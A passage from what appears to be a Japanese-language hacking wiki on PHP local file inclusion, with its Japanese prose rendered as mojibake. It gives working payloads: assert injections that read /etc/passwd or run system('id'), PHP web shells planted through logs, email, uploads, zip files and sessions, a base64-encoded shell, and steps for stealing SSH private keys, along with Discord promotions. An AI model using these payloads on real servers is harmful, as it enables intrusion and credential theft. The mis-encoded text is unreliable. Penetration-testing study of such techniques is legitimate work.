* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” HTTP(s) URLã¸ã®ã‚¢ã‚¯ã‚»ã‚¹
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” FTP(s) URLã¸ã®ã‚¢ã‚¯ã‚»ã‚¹
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” åœ§ç¸®ã‚¹ãƒˆãƒªãƒ¼ãƒ 
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” ãƒ‘ã‚¿ãƒ¼ãƒ³ã«ä¸€è‡´ã™ã‚‹ãƒ‘ã‚¹åã‚’è¦‹ã¤ã‘ã‚‹ï¼ˆä½•ã‚‚å°åˆ·å¯èƒ½ãªã‚‚ã®ã‚’è¿”ã•ãªã„ã®ã§ã€ã“ã“ã§ã¯ã‚ã¾ã‚Šå½¹ã«ç«‹ãŸãªã„ï¼‰
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” ã‚»ã‚­ãƒ¥ã‚¢ã‚·ã‚§ãƒ«2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” ã‚ªãƒ¼ãƒ‡ã‚£ã‚ªã‚¹ãƒˆãƒªãƒ¼ãƒ ï¼ˆä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã‚€ã«ã¯å½¹ã«ç«‹ãŸãªã„ï¼‰

## PHPã®'assert'ã«ã‚ˆã‚‹LFI

PHPã«ãŠã‘ã‚‹ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆLFIï¼‰ã®ãƒªã‚¹ã‚¯ã¯ã€æ–‡å­—åˆ—å†…ã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹'assert'é–¢æ•°ã‚’æ‰±ã†éš›ã«ç‰¹ã«é«˜ããªã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€".."ã®ã‚ˆã†ãªãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«æ–‡å­—ã‚’å«ã‚€å…¥åŠ›ãŒãƒã‚§ãƒƒã‚¯ã•ã‚Œã¦ã„ã‚‹ãŒã€é©åˆ‡ã«ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã•ã‚Œã¦ã„ãªã„å ´åˆã«ç‰¹ã«å•é¡Œã§ã™ã€‚

ä¾‹ãˆã°ã€PHPã‚³ãƒ¼ãƒ‰ã¯æ¬¡ã®ã‚ˆã†ã«ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’é˜²ãã‚ˆã†ã«è¨­è¨ˆã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ï¼š
```bash
assert("strpos('$file', '..') === false") or die("");
```
ã“ã®å¯¾ç­–ã¯ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’é˜²ãã“ã¨ã‚’ç›®çš„ã¨ã—ã¦ã„ã¾ã™ãŒã€æ„å›³ã›ãšã‚³ãƒ¼ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®ãƒ™ã‚¯ã‚¿ãƒ¼ã‚’ä½œæˆã—ã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’èª­ã¿å–ã‚‹ãŸã‚ã«ã“ã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã«ã¯ã€æ”»æ’ƒè€…ã¯æ¬¡ã®ã‚ˆã†ãªæ‰‹æ³•ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
åŒæ§˜ã«ã€ä»»æ„ã®ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€æ¬¡ã®ã‚ˆã†ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ï¼š
```plaintext
' and die(system("id")) or '
```
é‡è¦ãªã®ã¯ã€**ã“ã‚Œã‚‰ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨**ã§ã™ã€‚

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚‹ãŸã‚ã«ã€[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¦ãã ã•ã„ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨èª²é¡Œã«æ·±ãæ˜ã‚Šä¸‹ã’ãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã—ã¾ã—ã‚‡ã†

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€æ€¥é€Ÿã«å¤‰åŒ–ã™ã‚‹ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã«é…ã‚Œãšã«ã¤ã„ã¦ã„ãã¾ã—ã‚‡ã†

**æœ€æ–°ã®ãŠçŸ¥ã‚‰ã›**\
æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æ›´æ–°ã«ã¤ã„ã¦æƒ…å ±ã‚’å¾—ã¾ã—ã‚‡ã†

[**Discord**](https://discord.com/invite/N3FrSbmwdy)ã§ç§ãŸã¡ã«å‚åŠ ã—ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨ã‚³ãƒ©ãƒœãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼

## PHPãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰ãƒ‘ã‚¹ã‚¹ãƒ©ãƒ™ãƒ«

{% hint style="warning" %}
ã“ã®æŠ€è¡“ã¯ã€**PHPé–¢æ•°**ã®**ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹**ã‚’**åˆ¶å¾¡**ã§ãã‚‹å ´åˆã«é–¢é€£ã—ã¦ã„ã¾ã™ãŒã€ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ï¼ˆ**`file()`**ã¸ã®å˜ç´”ãªå‘¼ã³å‡ºã—ã®ã‚ˆã†ã«ï¼‰ãŒã€å†…å®¹ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã€‚
{% endhint %}

[**ã“ã®ç´ æ™´ã‚‰ã—ã„æŠ•ç¨¿**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)ã§ã¯ã€ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰ãƒ‘ã‚¹ã‚¹ãƒ©ãƒ™ãƒ«ãŒPHPãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä»‹ã—ã¦**ã‚¨ãƒ©ãƒ¼ã‚ªãƒ©ã‚¯ãƒ«ã‚’ä»‹ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’æŠ½å‡ºã™ã‚‹**æ–¹æ³•ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚

è¦ç´„ã™ã‚‹ã¨ã€ã“ã®æŠ€è¡“ã¯**"UCS-4LE"ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°**ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’éå¸¸ã«**å¤§ãã**ã—ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’é–‹ã**PHPé–¢æ•°**ãŒ**ã‚¨ãƒ©ãƒ¼**ã‚’å¼•ãèµ·ã“ã™ã‚ˆã†ã«ã—ã¾ã™ã€‚

æ¬¡ã«ã€æœ€åˆã®æ–‡å­—ã‚’æ¼æ´©ã•ã›ã‚‹ãŸã‚ã«ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼**`dechunk`**ãŒä½¿ç”¨ã•ã‚Œã€**base64**ã‚„**rot13**ãªã©ã®ä»–ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¨å…±ã«ä½¿ç”¨ã•ã‚Œã€æœ€çµ‚çš„ã«ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼**convert.iconv.UCS-4.UCS-4LE**ã¨**convert.iconv.UTF16.UTF-16BE**ãŒä½¿ç”¨ã•ã‚Œã¦**ä»–ã®æ–‡å­—ã‚’æœ€åˆã«é…ç½®ã—ã¦æ¼æ´©ã•ã›ã¾ã™**ã€‚

**è„†å¼±æ€§ãŒã‚ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹é–¢æ•°**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (ã“ã‚Œã§èª­ã¿å–ã‚Šå°‚ç”¨ã®ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã¿)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

æŠ€è¡“çš„ãªè©³ç´°ã«ã¤ã„ã¦ã¯ã€å‰è¿°ã®æŠ•ç¨¿ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼

## LFI2RCE

### ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³

å‰è¿°ã®é€šã‚Šã€[**ã“ã®ãƒªãƒ³ã‚¯ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„**](./#remote-file-inclusion)ã€‚

### Apache/Nginxãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«çµŒç”±

Apacheã¾ãŸã¯Nginxã‚µãƒ¼ãƒãƒ¼ãŒ**LFIã«è„†å¼±**ãªå ´åˆã€ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰é–¢æ•°å†…ã§**`/var/log/apache2/access.log`ã¾ãŸã¯`/var/log/nginx/access.log`**ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆ**å†…ã¾ãŸã¯**GETãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**å†…ã«PHPã‚·ã‚§ãƒ«ã®ã‚ˆã†ãª**`<?php system($_GET['c']); ?>`**ã‚’è¨­å®šã—ã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% hint style="warning" %}
ã‚·ã‚§ãƒ«ã«**ã‚·ãƒ³ã‚°ãƒ«ã‚¯ã‚©ãƒ¼ãƒˆ**ã®ä»£ã‚ã‚Šã«**ãƒ€ãƒ–ãƒ«ã‚¯ã‚©ãƒ¼ãƒˆ**ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒ€ãƒ–ãƒ«ã‚¯ã‚©ãƒ¼ãƒˆãŒæ–‡å­—åˆ—"_**quote;**_"ã«å¤‰æ›´ã•ã‚Œã€**PHPã¯ã‚¨ãƒ©ãƒ¼ã‚’ã‚¹ãƒ­ãƒ¼**ã—ã€**ä»–ã®ä½•ã‚‚å®Ÿè¡Œã•ã‚Œã¾ã›ã‚“**ã€‚

ã¾ãŸã€**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ­£ã—ãè¨˜è¿°ã™ã‚‹**ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚ãã†ã—ãªã„ã¨ã€PHPã¯ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚‚ã†ã¨ã™ã‚‹ãŸã³ã«ã‚¨ãƒ©ãƒ¼ã‚’å‡ºã—ã€äºŒåº¦ã¨ãƒãƒ£ãƒ³ã‚¹ãŒã‚ã‚Šã¾ã›ã‚“ã€‚
{% endhint %}

ä»–ã®ãƒ­ã‚°ã§ã‚‚ã“ã‚Œã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ãŒã€**æ³¨æ„ã—ã¦ãã ã•ã„**ã€ãƒ­ã‚°å†…ã®ã‚³ãƒ¼ãƒ‰ã¯URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€ã“ã‚ŒãŒã‚·ã‚§ãƒ«ã‚’ç ´å£Šã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãƒ˜ãƒƒãƒ€ãƒ¼**authorization "basic"**ã«ã¯ã€Base64ã§ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸ"user:password"ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ãƒ­ã‚°å†…ã§ãƒ‡ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¾ã™ã€‚PHPShellã¯ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼å†…ã«æŒ¿å…¥ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
ä»–ã®å¯èƒ½ãªãƒ­ã‚°ãƒ‘ã‚¹:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**å†…éƒ¨ã‚¢ã‚«ã‚¦ãƒ³ãƒˆï¼ˆuser@localhostï¼‰ã«ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡**ã—ã€`<?php echo system($_REQUEST["cmd"]); ?>`ã®ã‚ˆã†ãªPHPãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚ã€**`/var/mail/<USERNAME>`**ã¾ãŸã¯**`/var/spool/mail/<USERNAME>`**ã®ã‚ˆã†ãªãƒ‘ã‚¹ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã«å«ã‚ã‚‹ã“ã¨ã‚’è©¦ã¿ã¾ã™ã€‚

### Via /proc/\*/fd/\*

1. å¤šãã®ã‚·ã‚§ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ï¼ˆä¾‹ï¼š100ï¼‰
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)ã‚’å«ã‚ã¾ã™ã€‚ã“ã“ã§ã€$PIDã¯ãƒ—ãƒ­ã‚»ã‚¹ã®PIDï¼ˆãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹å¯èƒ½ï¼‰ã§ã€$FDã¯ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‡ã‚£ã‚¹ã‚¯ãƒªãƒ—ã‚¿ï¼ˆã“ã¡ã‚‰ã‚‚ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹å¯èƒ½ï¼‰ã§ã™ã€‚

### Via /proc/self/environ

ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚ˆã†ã«ã€User-Agentã«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€/proc/self/environãƒ•ã‚¡ã‚¤ãƒ«å†…ã«åæ˜ ã•ã‚Œã¾ã™ã€‚
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹å ´åˆã¯ã€ã‚·ã‚§ãƒ«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãã®ä¸­ã«æ³¨å…¥ã—ã¾ã™ï¼ˆä¾‹ï¼š `<?php system($_GET['c']); ?>` ï¼‰ã€‚
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿ã‚„ã™ãä¿ã¤ãŸã‚ã«ã¯ã€ç”»åƒ/doc/pdfã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã«æ³¨å…¥ã™ã‚‹ã®ãŒæœ€é©ã§ã™ã€‚

### Zipãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰çµŒç”±

PHPã‚·ã‚§ãƒ«ã‚’åœ§ç¸®ã—ãŸZIPãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã€ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒPHPã‚»ãƒƒã‚·ãƒ§ãƒ³ï¼ˆPHPSESSIDï¼‰ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ç¢ºèªã—ã¦ãã ã•ã„ã€‚
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHPã€ã“ã‚Œã‚‰ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã¯ _/var/lib/php5/sess\\_\[PHPSESSID]\_ ãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Set the cookie to `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFIã‚’ä½¿ç”¨ã—ã¦PHPã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å«ã‚ã¾ã™
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

sshãŒã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãªå ´åˆã€ã©ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’ç¢ºèªã—ã¾ã™ï¼ˆ/proc/self/status & /etc/passwdï¼‰ã—ã€**\<HOME>/.ssh/id\_rsa**ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’è©¦ã¿ã¾ã™ã€‚

### **Via** **vsftpd** _**logs**_

FTPã‚µãƒ¼ãƒãƒ¼vsftpdã®ãƒ­ã‚°ã¯_**/var/log/vsftpd.log**_ã«ã‚ã‚Šã¾ã™ã€‚Local File Inclusion (LFI)ã®è„†å¼±æ€§ãŒå­˜åœ¨ã—ã€å…¬é–‹ã•ã‚ŒãŸvsftpdã‚µãƒ¼ãƒãƒ¼ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ãªã‚·ãƒŠãƒªã‚ªã§ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’è€ƒæ…®ã§ãã¾ã™ã€‚

1. ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ä¸­ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼åãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«PHPãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã—ã¾ã™ã€‚
2. æ³¨å…¥å¾Œã€LFIã‚’åˆ©ç”¨ã—ã¦_**/var/log/vsftpd.log**_ã‹ã‚‰ã‚µãƒ¼ãƒãƒ¼ãƒ­ã‚°ã‚’å–å¾—ã—ã¾ã™ã€‚

### Via php base64 filter (using base64)

[ã“ã¡ã‚‰](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64)ã®è¨˜äº‹ã«ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€PHPã®base64ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¯ébase64ã‚’ç„¡è¦–ã—ã¾ã™ã€‚ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«æ‹¡å¼µå­ã®ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã§ãã¾ã™ï¼šã‚‚ã—".php"ã§çµ‚ã‚ã‚‹base64ã‚’æä¾›ã™ã‚‹ã¨ã€"."ã‚’ç„¡è¦–ã—ã¦"php"ã‚’base64ã«è¿½åŠ ã—ã¾ã™ã€‚ä»¥ä¸‹ã¯ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ä¾‹ã§ã™ï¼š
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

ã“ã®[**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)ã¯ã€**phpãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ä»»æ„ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å‡ºåŠ›ã¨ã—ã¦ç”Ÿæˆã§ãã‚‹**ã“ã¨ã‚’èª¬æ˜ã—ã¦ã„ã¾ã™ã€‚åŸºæœ¬çš„ã«ã¯ã€**ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã‚€ã“ã¨ãªãä»»æ„ã®phpã‚³ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã§ãã‚‹**ã¨ã„ã†ã“ã¨ã§ã™ã€‚

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via segmentation fault

**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã—ã€ãã‚ŒãŒ**ä¸€æ™‚çš„ã«**`/tmp`ã«ä¿å­˜ã•ã‚Œã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ãã®å¾Œã€**åŒã˜ãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã§**ã€**ã‚»ã‚°ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãƒ•ã‚©ãƒ«ãƒˆ**ã‚’å¼•ãèµ·ã“ã™ã¨ã€**ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã¯å‰Šé™¤ã•ã‚Œãš**ã€ãã‚Œã‚’æ¢ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via Nginx temp file storage

**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’è¦‹ã¤ã‘ã€**Nginx**ãŒPHPã®å‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ¬¡ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ã¦RCEã‚’å–å¾—ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’è¦‹ã¤ã‘ãŸå ´åˆã€**ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒãªã„**å ´åˆã§ã‚‚ã€`session.auto_start`ãŒ`Off`ã§ã‚ã£ã¦ã‚‚ã€**`PHP_SESSION_UPLOAD_PROGRESS`**ã‚’**ãƒãƒ«ãƒãƒ‘ãƒ¼ãƒˆPOST**ãƒ‡ãƒ¼ã‚¿ã§æä¾›ã™ã‚‹ã¨ã€PHPã¯**ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’æœ‰åŠ¹ã«ã—ã¾ã™**ã€‚ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦RCEã‚’å–å¾—ã§ãã¾ã™ï¼š

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via temp file uploads in Windows

**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’è¦‹ã¤ã‘ã€ã‚µãƒ¼ãƒãƒ¼ãŒ**Windows**ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã€RCEã‚’å–å¾—ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via phpinfo() (file\_uploads = on)

**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’è¦‹ã¤ã‘ã€ãƒ•ã‚¡ã‚¤ãƒ«ãŒ**phpinfo()**ã‚’å…¬é–‹ã—ã¦ã„ã¦ã€file\_uploadsãŒonã®å ´åˆã€RCEã‚’å–å¾—ã§ãã¾ã™ï¼š

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

